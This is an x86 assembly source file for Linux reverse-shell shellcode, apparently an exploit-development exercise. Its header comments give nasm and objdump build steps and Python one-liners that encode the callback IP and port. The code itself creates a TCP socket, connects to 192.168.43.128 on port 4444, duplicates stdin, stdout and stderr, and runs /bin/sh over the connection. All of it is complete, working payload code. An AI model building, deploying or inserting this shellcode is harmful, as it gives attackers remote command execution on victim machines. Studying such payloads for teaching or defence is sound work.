; Description:
; * Position independent x86 shellcode free of null bytes that executes a reverse shell via execve()
; * Socket is connected, file descriptors duplicated, then /bin/sh is executed as an interactive shell.
; Synopsis:
; * Socket is first created using the socket() syscall
; * A connection to the remote endpoint using the connect() and sockets file descriptor.
; * The stdin, stdout, and stderr file descriptors are duplicated via dup2().
; * A syscall to execve() is leveraged to spawn /bin/sh bound to the connection.
; Notes:
; * Manually compile via nasm, then obtain raw byte-code via command-line.
; nasm -f elf32 x86-reverse-tcp.asm -o x86-reverse-tcp.o; for i in $(objdump -D x86-reverse-tcp.o|grep "^ "|cut -f2);do echo -n $i; done; echo
; * Generate encoded IP address.
; python -c 'from sys import argv;a=argv[1].split(".");a.reverse();a="".join([hex(int(oct)).lstrip("0x") for oct in a]);print(f"0x{a}")' "192.168.43.128"
; * Generate encoded TCP port.
; python -c 'from sys import argv;from struct import pack;from binascii import hexlify;print("0x"+hexlify(pack("<H",int(argv[1]))).decode())' 4444

global _start
section .text

_start:
; Begin execution with Socket function

socket:
; Create socket file descriptor as an endpoint for communication via socket()
    xor ecx, ecx
    mov ebx, ecx
; Prepare protocol argument TCP (edx 0x00)
    mul ebx
; Prepare type argument SOCK_STREAM (ecx 0x01)
    inc cl
; Prepare domain argument AF_INET (ebx 0x02)
    inc bl
    inc bl
; Prepare socket() syscall (eax 0x167)
    mov ax, 0x167
; Execute syscall socket(int domain, int type, int protocol);
    int 0x80

connect:
; Initiate a connection on a socket using the new file descriptor via connect()
; Prepare sockfd argument (ebx int sockfd)
    xchg ebx, eax
; Prepare sockaddr structure argument
    dec cl
    push ecx
; Prepare addrlen argument (edx 0x16)
    mov dl, 0x16
; Prepare IP address of addr argument on stack (192.168.43.128 0x802ba8c0)
    mov ecx, 0x802ba8c0
    push ecx
; Prepare TCP port of addr argument on stack (TCP 4444 0x5c11)
    push word 0x5c11
; Prepare AF_INET family
    push word 0x02
    lea ecx, [esp]
; Prepare connect() syscall (eax 0x16a)
    mov ax, 0x16a
; Execute syscall connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    int 0x80

dup:
; Prepare registers for calls to dup2() with ebx containing the sockfd
    xor ecx, ecx
; Set count of file descriptors to duplicate: stdin, stdout, stderr
    mov cl, 0x3

dup2:
; Duplicate file descriptors for new connection using dup2()
    xor eax, eax
; Prepare dup2() syscall (eax 0x3f)
    mov al, 0x3f
; Decrease count for next descriptor
    dec cl
; Execute syscall dup2(int oldfd, int newfd);
    int 0x80
; Duplicate remaining descriptor if needed
    jnz dup2

execve:
; Execute program bound to duplicated file descriptors via execve()
    cdq
    mul edx
    lea ecx, [eax]
; Prepare pathname argument on stack /bin//sh
    mov esi, 0x68732f2f
    mov edi, 0x6e69622f
; Push null terminated pathname to stack
    push ecx
    push esi
    push edi
; Set pathname argument
    lea ebx, [esp]
; Prepare execve() syscall (eax 0x0b)
    mov al, 0xb
; Execute syscall execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
    int 0x80
